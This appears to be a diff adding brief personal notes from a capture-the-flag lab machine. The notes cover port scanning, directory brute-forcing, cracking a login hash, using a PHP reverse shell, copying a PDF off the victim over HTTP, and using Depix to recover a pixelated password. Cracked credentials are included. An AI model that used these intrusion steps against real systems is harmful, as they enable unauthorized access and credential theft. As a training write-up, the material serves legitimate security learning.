@@ -1,0 +1,26 @@
+nmap -sV -sC -oN nmap 10.10.11.25
+
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp?
+5678/tcp open  http
+
+gobuster dir -u http://10.10.11.25:3000/ -w /usr/share/wordlists/dirb/big.txt
+
+https://crackstation.net
+
+login.php = iloveyou1
+
+php-reverse-shell.php  --> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+python3 -m http.server 8080 --> in victim machine
+wget http://10.10.11.25:8080/'Using OpenVAS.pdf' --> my local machine
+
+htps://tools.pdf24.org
+https://github.com/spipm/Depix --> for recovering pixilized images
+
+pdfimages -all Using\ OpenVAS.pdf 'img'
+
+git clone https://github.com/spipm/Depix.git
+
+password extracted --> sidefromsidetheothersidesidefromsidetheotherside
